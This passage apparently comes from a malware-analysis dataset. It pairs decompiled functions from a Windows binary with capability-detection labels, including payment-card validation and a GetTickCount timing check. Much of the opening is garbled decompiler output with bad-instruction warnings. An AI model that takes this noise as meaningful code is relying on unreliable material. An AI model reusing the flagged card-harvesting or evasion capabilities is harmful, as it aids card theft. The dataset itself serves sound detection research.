= *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        uVar16 = *puVar29;\n                        *puVar29 = *puVar29 + uVar18;\n                        uVar40 = pcVar21;\n                        bVar54 = CARRY1(*puVar29, uVar40) || CARRY1(*puVar29 + uVar40, CARRY1(uVar16, uVar18));\n                        *puVar29 = *puVar29 + uVar40 + CARRY1(uVar16, uVar18);\n                        bVar53 = CARRY1(*puVar29, uVar40) || CARRY1(*puVar29 + uVar40, bVar54);\n                        *puVar29 = *puVar29 + uVar40 + bVar54;\n                        bVar54 = CARRY1(*puVar29, uVar40) || CARRY1(*puVar29 + uVar40, bVar53);\n                        *puVar29 = *puVar29 + uVar40 + bVar53;\n                        bVar53 = CARRY1(*puVar29, uVar40) || CARRY1(*puVar29 + uVar40, bVar54);\n                        *puVar29 = *puVar29 + uVar40 + bVar54;\n                        bVar54 = CARRY1(*puVar29, uVar40) || CARRY1(*puVar29 + uVar40, bVar53);\n                        *puVar29 = *puVar29 + uVar40 + bVar53;\n                        bVar53 = CARRY1(*puVar29, uVar40) || CARRY1(*puVar29 + uVar40, bVar54);\n                        *puVar29 = *puVar29 + uVar40 + bVar54;\n                        bVar54 = CARRY1(*puVar29, uVar40) || CARRY1(*puVar29 + uVar40, bVar53);\n                        *puVar29 = *puVar29 + uVar40 + bVar53;\n                        bVar53 = CARRY1(*puVar29, uVar40) || CARRY1(*puVar29 + uVar40, bVar54);\n                        *puVar29 = *puVar29 + uVar40 + bVar54;\n                        bVar54 = CARRY1(*puVar29, uVar40) || CARRY1(*puVar29 + uVar40, bVar53);\n                        *puVar29 = *puVar29 + uVar40 + bVar53;\n                        bVar53 = CARRY1(*puVar29, uVar40) || CARRY1(*puVar29 + uVar40, bVar54);\n                        *puVar29 = *puVar29 + uVar40 + bVar54;\n                        bVar54 = CARRY1(*puVar29, uVar40) || CARRY1(*puVar29 + uVar40, bVar53);\n                        *puVar29 = *puVar29 + uVar40 + bVar53;\n                        uVar15 = *puVar29;\n                        uVar16 = *puVar29;\n                        *puVar29 = uVar16 + uVar40 + bVar54;\n                        *puVar29 = *puVar29 + uVar40 + (CARRY1(uVar15, uVar40) || CARRY1(uVar16 + uVar40, bVar54));\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        uVar34 = puVar29 >> 8;\n                        *puVar29 = *puVar29 & uVar34;\n                        *puVar29 = *puVar29 & uVar34;\n                        *puVar29 = *puVar29 & uVar34;\n                        *puVar29 = *puVar29 & uVar34;\n                        *puVar29 = *puVar29 & uVar34;\n                        *puVar29 = *puVar29 & uVar34;\n                        *puVar29 = *puVar29 & uVar34;\n                        *puVar29 = *puVar29 & uVar34;\n                        *puVar29 = *puVar29 & uVar34;\n                        *puVar29 = *puVar29 & uVar34;\n                        *puVar29 = *puVar29 & uVar34;\n                        *puVar29 = *puVar29 & uVar34;\n                        *puVar29 = *puVar29 & uVar34;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 & uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar40;\n                        *puVar29 = *puVar29 + uVar40;\n                        *puVar29 = *puVar29 + uVar40;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar34;\n                        *puVar29 = *puVar29 + uVar34;\n                        uVar16 = *puVar29;\n                        *puVar29 = *puVar29 + uVar34;\n                        *puVar29 = *puVar29 + uVar18 + CARRY1(uVar16, uVar34);\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar34;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 & uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar34;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        uVar16 = *puVar29;\n                        *puVar29 = *puVar29 + uVar40;\n                        bVar54 = CARRY1(*puVar29, uVar40) || CARRY1(*puVar29 + uVar40, CARRY1(uVar16, uVar40));\n                        *puVar29 = *puVar29 + uVar40 + CARRY1(uVar16, uVar40);\n                        bVar53 = CARRY1(*puVar29, uVar40) || CARRY1(*puVar29 + uVar40, bVar54);\n                        *puVar29 = *puVar29 + uVar40 + bVar54;\n                        bVar54 = CARRY1(*puVar29, uVar40) || CARRY1(*puVar29 + uVar40, bVar53);\n                        *puVar29 = *puVar29 + uVar40 + bVar53;\n                        bVar53 = CARRY1(*puVar29, uVar40) || CARRY1(*puVar29 + uVar40, bVar54);\n                        *puVar29 = *puVar29 + uVar40 + bVar54;\n                        bVar54 = CARRY1(*puVar29, uVar40) || CARRY1(*puVar29 + uVar40, bVar53);\n                        *puVar29 = *puVar29 + uVar40 + bVar53;\n                        bVar53 = CARRY1(*puVar29, uVar40) || CARRY1(*puVar29 + uVar40, bVar54);\n                        *puVar29 = *puVar29 + uVar40 + bVar54;\n                        bVar54 = CARRY1(*puVar29, uVar40) || CARRY1(*puVar29 + uVar40, bVar53);\n                        *puVar29 = *puVar29 + uVar40 + bVar53;\n                        bVar53 = CARRY1(*puVar29, uVar40) || CARRY1(*puVar29 + uVar40, bVar54);\n                        *puVar29 = *puVar29 + uVar40 + bVar54;\n                        bVar54 = CARRY1(*puVar29, uVar40) || CARRY1(*puVar29 + uVar40, bVar53);\n                        *puVar29 = *puVar29 + uVar40 + bVar53;\n                        uVar15 = *puVar29;\n                        uVar16 = *puVar29;\n                        *puVar29 = uVar16 + uVar40 + bVar54;\n                        *puVar29 = *puVar29 + uVar40 + (CARRY1(uVar15, uVar40) || CARRY1(uVar16 + uVar40, bVar54));\n                        uVar16 = *puVar29;\n                        *puVar29 = *puVar29 + uVar40;\n                        bVar54 = CARRY1(*puVar29, uVar40) || CARRY1(*puVar29 + uVar40, CARRY1(uVar16, uVar40));\n                        *puVar29 = *puVar29 + uVar40 + CARRY1(uVar16, uVar40);\n                        uVar16 = *puVar29;\n                        uVar15 = *puVar29;\n                        *puVar29 = uVar15 + uVar40 + bVar54;\n                        *puVar29 = *puVar29 + uVar40 + (CARRY1(uVar16, uVar40) || CARRY1(uVar15 + uVar40, bVar54));\n                        *puVar29 = *puVar29 & uVar34;\n                        *puVar29 = *puVar29 & uVar34;\n                        *puVar29 = *puVar29 & uVar34;\n                        *puVar29 = *puVar29 & uVar34;\n                        *puVar29 = *puVar29 & uVar34;\n                        *puVar29 = *puVar29 & uVar34;\n                        *puVar29 = *puVar29 & uVar34;\n                        *puVar29 = *puVar29 & uVar34;\n                        *puVar29 = *puVar29 & uVar34;\n                        *puVar29 = *puVar29 & uVar34;\n                        *puVar29 = *puVar29 & uVar34;\n                        *puVar29 = *puVar29 & uVar34;\n                        *puVar29 = *puVar29 + uVar34;\n                        *puVar29 = *puVar29 & uVar34;\n                        *puVar29 = *puVar29 & uVar34;\n                        *puVar29 = *puVar29 & uVar34;\n                        *puVar29 = *puVar29 & uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        puVar30 = uVar51 + 0x62;\n                        bVar54 = CARRY1(*puVar30, uVar34);\n                        uVar16 = *puVar30;\n                        *puVar30 = *puVar30 + uVar34;\n                        uVar15 = *puVar30;\n                        puVar1 = iVar24 + 0x66;\n                        iVar6 = (puVar45 & 3) - (*puVar1 & 3);\n                        *puVar1 = *puVar1 + bVar54 * iVar6;\n                        uVar44 = puVar45 - 4;\n                        uVar46 = puVar45 & 0xffff0000 | uVar44;\n                        puVar23 = segment(in_SS, uVar44);\n                        *puVar23 = 0x6c6b6a69;\n                        uVar42 = SUB42(pcVar21, 0);\n                        uVar20 = in(uVar42);\n                        *puVar31 = uVar20;\n                        out(*puVar25, uVar42);\n                        out(*(puVar25 + 1), uVar42);\n                        if (SCARRY1(uVar16, uVar34)) goto code_r0x0046719b;\n                        if (bVar54) {\ncode_r0x0046719f:\n                            out(0xe8, puVar29);\n    // WARNING: Bad instruction - Truncating control flow here\n                            halt_baddata();\n                        }\n                        if (0 < iVar6) goto code_r0x00467191;\n                        in_stack_00000050 = uVar17;\n                        uStack2 = uVar10;\n                        if (bVar54 || 0 < iVar6) {\n                            out(uVar42, puVar29);\n                            LOCK();\n                            pcVar9 = swi(1);\n                            (*pcVar9)();\n                            return;\n                        }\n                        if (uVar15 < '\\0') {\n                            do {\n    // WARNING: Do nothing block with infinite loop\n                            } while( true );\n                        }\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *(uVar51 + 0x42) = *(uVar51 + 0x42) + uVar18;\n                        *(uVar46 - 4) = puVar29 + -1;\n                        *(uVar46 - 8) = uVar51 - 1;\n                        *(uVar46 - 0xc) = pcVar21 + -1;\n                        *(uVar46 - 0x10) = CONCAT13(uStack00000060, Stack0000005d);\n                        *(uVar46 - 0x14) = uVar46 - 0x10;\n                        *(uVar46 - 0x18) = iVar24;\n                        *(uVar46 - 0x1c) = puVar25 + 5;\n                        *(uVar46 - 0x20) = puVar31 + 1;\n                        puVar31 = *(uVar46 - 0x20);\n                        cVar14 = puVar31;\n                        *puVar31 = *puVar31 + cVar14;\n                        *puVar31 = *puVar31 + cVar14;\n                        *puVar31 = *puVar31 + cVar14;\n                        *puVar31 = *puVar31 + cVar14;\n                        *puVar31 = *puVar31;\n                        *puVar31 = *puVar31 + cVar14;\n                        *puVar31 = *puVar31 + cVar14;\n                        *(uVar46 - 0x16) = in_CS;\n                        *(uVar46 - 0x1a) = 0x467169;\n                        uVar55 = func_0x9e009c00();\n                        piVar32 = uVar55;\n                        cVar14 = uVar55;\n                        *piVar32 = *piVar32 + cVar14;\n                        *piVar32 = *piVar32 + cVar14;\n                        *piVar32 = *piVar32 + cVar14;\n                        *piVar32 = *piVar32 + cVar14;\n                        pcVar21 = (uVar55 >> 0x20) + -0x71ff7400;\n                        *pcVar21 = *pcVar21 + extraout_ECX_01;\n                        *piVar32 = *piVar32 + 1;\n                        *piVar32 = *piVar32 + cVar14;\n                        *piVar32 = *piVar32 + cVar14;\n                        uVar51 = extraout_ECX_01;\n                        do {\n                            pcVar21 = uVar55;\n                            *pcVar21 = *pcVar21 + uVar55;\n                            *pcVar21 = *pcVar21 + uVar55;\n                            while( true ) {\n                                pcVar22 = uVar55 >> 0x20;\n                                pcVar21 = uVar55;\n                                *pcVar22 = *pcVar22 + (uVar51 >> 8);\n                                cVar14 = uVar55;\n                                *pcVar21 = *pcVar21 + cVar14;\n                                *pcVar21 = *pcVar21 + cVar14;\n                                *pcVar21 = *pcVar21 + cVar14;\n                                uVar51 = uVar51 & 0xffff00ff;\n                                *pcVar21 = *pcVar21 + cVar14;\ncode_r0x00467191:\n                                pcVar21 = uVar55 >> 0x20;\n                                *pcVar21 = *pcVar21 + (uVar19 >> 0x10);\n                                uVar16 = uVar55 + (uVar55 >> 8);\n                                puVar29 = uVar55 & 0xffffff00 | uVar16;\n                                uVar55 = uVar55 & 0xffffffff00000000 | ZEXT48(puVar29);\n                                uVar51 = uVar51 - 1;\n                                if (uVar51 != 0 && uVar16 == 0) break;\ncode_r0x0046719b:\n                                uVar55 = CONCAT44(pcVar21, puVar29);\n                                if (uVar51 != 0) {\n                                    puVar29 = in(0xe6);\n                                    goto code_r0x0046719f;\n                                }\n                            }\n                        } while( true );\n                    }\n                    if (SCARRY4(puVar37, 1)) {\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *puVar43 = *puVar43 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n    // WARNING: Bad instruction - Truncating control flow here\n                        halt_baddata();\n                    }\n                    *ppcVar26 = *ppcVar26 + uVar17;\n                    cVar14 = *ppcVar26;\n                    *ppcVar26 = *ppcVar26 + uVar17;\n                    if (!SCARRY1(cVar14, uVar17)) {\n                        *puVar43 = *puVar43 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n    // WARNING: Bad instruction - Truncating control flow here\n                        halt_baddata();\n                    }\n                }\n                cVar14 = ppcVar26;\n                *ppcVar26 = *ppcVar26 + cVar14;\n                *ppcVar26 = *ppcVar26 + cVar14;\n                *ppcVar26 = *ppcVar26 + cVar14;\n                cVar33 = ppcVar26 >> 8;\n                *(ppcVar26 + 0x42) = *(ppcVar26 + 0x42) + cVar33;\n                *ppcVar26 = *ppcVar26 + cVar14;\n                *ppcVar26 = *ppcVar26 + cVar14;\n                *(ppcVar26 + 0x42) = *(ppcVar26 + 0x42) + cVar33;\n                *in_stack_00000035 = *in_stack_00000035 + cVar14;\ncode_r0x0046690d:\n                *ppcVar26 = *ppcVar26 + ppcVar26;\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 3:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 4:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 5:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 6:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 7:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 8:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 9:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 10:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0xb:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            pcVar21 = fcn.0042d26d(0, &var_4h, &var_8h);\n            uVar51 = uVar51 + 1;\n            uVar35 = extraout_ECX_00;\n        } while (pcVar21 != NULL);\n    }\n    return;\n}\n",
        "token_count": 144039
    },
    "0040b580": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040b580(int32_t *arg_8h, uint *arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    uint32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    \n    if (arg_10h == 0) {\n        return in_EAX & 0xffffff00;\n    }\n    iVar1 = (**0x462e74)(arg_10h, arg_14h, 0x40000001, 0, arg_ch);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    uVar2 = (**0x463094)(0, *arg_ch);\n    iVar1 = (**0x46301c)(uVar2);\n    *arg_8h = iVar1;\n    if (iVar1 == 0) {\n        return 0;\n    }\n    fcn.0042a6e0(iVar1, 0, *arg_ch);\n    uVar3 = (**0x462e74)(arg_10h, arg_14h, 0x40000001, *arg_8h, arg_ch);\n    return uVar3 & 0xffffff00 | uVar3 != 0;\n}\n",
        "token_count": 285
    },
    "0040b600": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b600(int32_t arg_8h)\n\n{\n    *0x452484 = *0x452484 + arg_8h;\n    return;\n}\n",
        "token_count": 42
    },
    "0040b770": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040b770(void)\n\n{\n    int32_t iVar1;\n    uint *arg_8h;\n    uint var_210h;\n    uint var_20ch;\n    uchar var_208h;\n    uint var_207h;\n    uint var_108h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4506f0 ^ &stack0xfffffffc;\n    var_210h = 0xff;\n    var_208h = 0;\n    fcn.0042a6e0(&var_207h, 0, 0xfe);\n    iVar1 = (**0x462f60)(0x80000001, *0x451ed8, 0, 0x20119, &var_20ch);\n    if (iVar1 == 0) {\n        (**0x462f44)(var_20ch, *0x452268, 0, 0, &var_208h, &var_210h);\n    }\n    (**0x462fe8)(var_20ch);\n    fcn.0042a6e0(&var_108h, 0, 0x104);\n    (**0x463038)(&var_108h, &var_208h);\n    arg_8h = &var_108h;\n    (**0x463038)(arg_8h, 0x446d58);\n    fcn.0040b610(&var_208h, *0x451bd0);\n    fcn.0040b610(&var_108h, *0x451e64);\n    fcn.0040b610(&var_108h, *0x451b74);\n    fcn.0040b610(&var_108h, *0x452324);\n    fcn.0040b610(&var_108h, *0x451ec4);\n    fcn.0040b610(&var_108h, *0x4520c8);\n    fcn.0042a75a(arg_8h);\n    return;\n}\n",
        "token_count": 453
    },
    "0040b8d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040b8d0(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    uVar1 = fcn.0041f060(*0x4521f4);\n    iVar2 = fcn.0042baa0(uVar1);\n    if (iVar2 == 0) {\n        uVar1 = fcn.0041f1c0(*0x45235c);\n        iVar2 = fcn.0042baa0(uVar1);\n        if (iVar2 == 0) {\n            (**0x462f9c)(0);\n        }\n    }\n    return;\n}\n",
        "token_count": 140
    },
    "0040b950": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040b950(char *arg_8h, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t arg_8h_00;\n    int32_t iVar2;\n    uint *in_ECX;\n    uint *puVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint var_4h;\n    \n    if ((arg_10h != 0) || (in_ECX[4] <= arg_ch && arg_ch != in_ECX[4])) {\n        if ((arg_ch < in_ECX[4]) && (uVar4 = in_ECX[4] - arg_ch,  arg_10h <= uVar4)) {\n            iVar5 = uVar4 + (1 - arg_10h);\n            puVar3 = in_ECX;\n            if (0xf < in_ECX[5]) {\n                puVar3 = *in_ECX;\n            }\n            iVar1 = puVar3 + arg_ch;\n            arg_8h_00 = fcn.0042d1c0(iVar1, *arg_8h, iVar5);\n            while (arg_8h_00 != 0) {\n                iVar2 = fcn.0042bc6b(arg_8h_00, arg_8h, arg_10h);\n                if (iVar2 == 0) {\n                    if (0xf < in_ECX[5]) {\n                        in_ECX = *in_ECX;\n                    }\n                    return arg_8h_00 - in_ECX;\n                }\n                iVar5 = iVar5 + -1 + (iVar1 - arg_8h_00);\n                iVar1 = arg_8h_00 + 1;\n                arg_8h_00 = fcn.0042d1c0(iVar1, *arg_8h, iVar5);\n            }\n        }\n        arg_ch = 0xffffffff;\n    }\n    return arg_ch;\n}\n",
        "token_count": 438
    },
    "0040ba00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040ba00(uint arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint *in_ECX;\n    char *pcVar5;\n    \n    uVar1 = in_ECX[4];\n    if (arg_ch < uVar1) {\n        puVar2 = in_ECX;\n        if (0xf < in_ECX[5]) {\n            puVar2 = *in_ECX;\n        }\n        puVar3 = in_ECX;\n        if (0xf < in_ECX[5]) {\n            puVar3 = *in_ECX;\n        }\n        for (pcVar5 = puVar3 + arg_ch; pcVar5 < uVar1 + puVar2; pcVar5 = pcVar5 + 1) {\n            iVar4 = fcn.0042d1c0(arg_8h, *pcVar5, arg_10h);\n            if (iVar4 == 0) {\n                if (0xf < in_ECX[5]) {\n                    in_ECX = *in_ECX;\n                }\n                return pcVar5 - in_ECX;\n            }\n        }\n    }\n    return -1;\n}\n",
        "token_count": 289
    },
    "0040ba70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040ba70(uint arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    char *pcVar4;\n    uint *in_ECX;\n    char *pcVar5;\n    uint var_4h;\n    \n    uVar1 = in_ECX[4];\n    if (uVar1 != 0) {\n        if (uVar1 <= arg_ch) {\n            arg_ch = uVar1 - 1;\n        }\n        puVar2 = in_ECX;\n        if (0xf < in_ECX[5]) {\n            puVar2 = *in_ECX;\n        }\n        pcVar5 = puVar2 + arg_ch;\n        iVar3 = fcn.0042d1c0(arg_8h, *pcVar5, arg_10h);\n        while( true ) {\n            if (iVar3 == 0) {\n                if (0xf < in_ECX[5]) {\n                    in_ECX = *in_ECX;\n                }\n                return pcVar5 - in_ECX;\n            }\n            pcVar4 = fcn.00405a90();\n            if (pcVar5 == pcVar4) break;\n            pcVar4 = pcVar5 + -1;\n            pcVar5 = pcVar5 + -1;\n            iVar3 = fcn.0042d1c0(arg_8h, *pcVar4, arg_10h);\n        }\n    }\n    return -1;\n}\n",
        "token_count": 344
    },
    "0040bb00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040bb00(uint *param_1)\n\n{\n    if (7 < param_1[5]) {\n        fcn.0042a679(*param_1);\n    }\n    param_1[5] = 7;\n    param_1[4] = 0;\n    *param_1 = 0;\n    return;\n}\n",
        "token_count": 80
    },
    "0040bb30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040bb30(int32_t **arg_8h, uint32_t arg_ch)\n\n{\n    int32_t **ppiVar1;\n    int32_t *piVar2;\n    int32_t **ppiVar3;\n    int32_t **in_ECX;\n    ulong uVar4;\n    \n    if (arg_8h != NULL) {\n        piVar2 = in_ECX[5];\n        ppiVar1 = in_ECX;\n        if (0xf < piVar2) {\n            ppiVar1 = *in_ECX;\n        }\n        if (ppiVar1 <= arg_8h) {\n            ppiVar1 = in_ECX;\n            if (0xf < piVar2) {\n                ppiVar1 = *in_ECX;\n            }\n            if (arg_8h < in_ECX[4] + ppiVar1) {\n                if (0xf < piVar2) {\n                    fcn.00405df0(in_ECX, arg_8h - *in_ECX, arg_ch);\n                    return;\n                }\n                fcn.00405df0(in_ECX, arg_8h - in_ECX, arg_ch);\n                return;\n            }\n        }\n    }\n    piVar2 = in_ECX[4];\n    ppiVar1 = arg_8h;\n    if (-piVar2 - 1U <= arg_ch) {\n        uVar4 = fcn.00429b7e(0x4452ec);\n        ppiVar1 = uVar4 >> 0x20;\n        piVar2 = uVar4;\n    }\n    uVar4 = CONCAT44(ppiVar1, piVar2);\n    if (arg_ch != 0) {\n        piVar2 = piVar2 + arg_ch;\n        if (piVar2 == 0xffffffff) {\n            uVar4 = fcn.00429b7e(0x4452ec);\n        }\n        ppiVar1 = uVar4 >> 0x20;\n        if (in_ECX[5] < piVar2) {\n            fcn.00405ba0(piVar2, uVar4);\n            ppiVar1 = arg_8h;\n            if (piVar2 == NULL) {\n                return;\n            }\n        }\n        else if (piVar2 == NULL) {\n            in_ECX[4] = NULL;\n            if (0xf < in_ECX[5]) {\n                **in_ECX = 0;\n                return;\n            }\n            *in_ECX = 0;\n            return;\n        }\n        ppiVar3 = in_ECX;\n        if (0xf < in_ECX[5]) {\n            ppiVar3 = *in_ECX;\n        }\n        fcn.0042a840(in_ECX[4] + ppiVar3, ppiVar1, arg_ch);\n        in_ECX[4] = piVar2;\n        if (0xf < in_ECX[5]) {\n            *(*in_ECX + piVar2) = 0;\n            return;\n        }\n        *(in_ECX + piVar2) = 0;\n    }\n    return;\n}\n",
        "token_count": 686
    },
    "0040be70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.0040be70(uchar *arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    *(arg_8h + 0x14) = 0xf;\n    *(arg_8h + 0x10) = 0;\n    *arg_8h = 0;\n    arg_ch = fcn.0042ad20(0x446d64);\n    fcn.004062a0(0x446d64, arg_ch);\n    return arg_8h;\n}\n",
        "token_count": 121
    },
    "0040beb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.0040beb0(uchar *arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    *(arg_8h + 0x14) = 0xf;\n    *(arg_8h + 0x10) = 0;\n    *arg_8h = 0;\n    arg_ch = fcn.0042ad20(0x446d68);\n    fcn.004062a0(0x446d68, arg_ch);\n    return arg_8h;\n}\n",
        "token_count": 121
    },
    "0040bef0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.0040bef0(uchar *arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    *(arg_8h + 0x14) = 0xf;\n    *(arg_8h + 0x10) = 0;\n    *arg_8h = 0;\n    arg_ch = fcn.0042ad20(0x446d8c);\n    fcn.004062a0(0x446d8c, arg_ch);\n    return arg_8h;\n}\n",
        "token_count": 123
    },
    "0040bf30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.0040bf30(uchar *arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    *(arg_8h + 0x14) = 0xf;\n    *(arg_8h + 0x10) = 0;\n    *arg_8h = 0;\n    arg_ch = fcn.0042ad20(0x446db4);\n    fcn.004062a0(0x446db4, arg_ch);\n    return arg_8h;\n}\n",
        "token_count": 121
    },
    "0040bf70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.0040bf70(uchar *arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    *(arg_8h + 0x14) = 0xf;\n    *(arg_8h + 0x10) = 0;\n    *arg_8h = 0;\n    arg_ch = fcn.0042ad20(0x446dc0);\n    fcn.004062a0(0x446dc0, arg_ch);\n    return arg_8h;\n}\n",
